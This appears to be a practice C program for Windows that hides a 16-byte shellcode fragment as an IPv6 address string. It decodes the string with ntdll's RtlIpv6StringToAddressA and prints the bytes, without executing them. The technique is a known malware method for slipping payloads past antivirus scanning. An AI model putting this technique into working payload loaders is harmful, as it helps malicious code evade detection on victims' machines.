#include <stdio.h>
#include <Windows.h>
#include <stdlib.h> // Pour malloc
#define _CRT_SECURE_NO_WARNINGS

char* Ipv6Array[1] = {
        "FC48:83E4:F0E8:C000:0000:4151:4150:5251"
};

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR       S,
    PCSTR* Terminator,
    PVOID       Addr
    );

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer = NULL;
    PBYTE           TmpBuffer = NULL;

    SIZE_T          sBuffSize = 0;

    PCSTR           Terminator = NULL;

    NTSTATUS        STATUS = 0;

    // Getting RtlIpv6StringToAddressA address from ntdll.dll
    fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "RtlIpv6StringToAddressA");
    if (pRtlIpv6StringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of IPv6 addresses * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    // Loop through all the IPv6 addresses saved in Ipv6Array
    for (SIZE_T i = 0; i < NmbrOfElements; i++) {

        // Deobfuscating one IPv6 address at a time
        // Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
        if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
            // if it failed
            printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv6Array[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer += 16;
    }

    // Save the base address & size of the deobfuscated payload
    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;
}

int main() {
    SIZE_T NmbrOfElements = sizeof(Ipv6Array) / sizeof(Ipv6Array[0]);
    PBYTE ppDAddress = NULL;
    SIZE_T pDSize = 0;

    printf("le shellcode du payload est %llu\n", NmbrOfElements); // Utilisation de %llu pour SIZE_T
    printf("let's start using this method\n");

    if (Ipv6Deobfuscation(Ipv6Array, NmbrOfElements, &ppDAddress, &pDSize)) {
        printf("tu va bien \n");
        for (SIZE_T i = 0; i < pDSize; i++) {
            printf("%02X ", ppDAddress[i]);
        }
        printf("\n");

        // Free the allocated memory after use
        HeapFree(GetProcessHeap(), 0, ppDAddress);
        return 0;
    }

    printf("error ");
    return 1;
}



